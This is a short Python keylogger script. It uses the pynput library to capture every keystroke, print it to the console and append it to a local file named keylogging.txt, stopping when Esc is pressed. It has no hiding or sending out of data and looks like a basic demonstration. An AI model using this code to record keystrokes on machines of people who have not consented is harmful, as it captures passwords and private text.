#!/usr/bin/env python3
# pip install pynput

from pynput import keyboard
import os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

def on_press(key):
    try:
        print(f'Key pressed: {key.char}')
        with open("./keylogging.txt", 'a') as file:
            file.write(f'{key.char}\n')
    except AttributeError:
        print(f'Special key pressed: {key}')
        with open("./keylogging.txt", 'a') as file:
            file.write(f'{key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
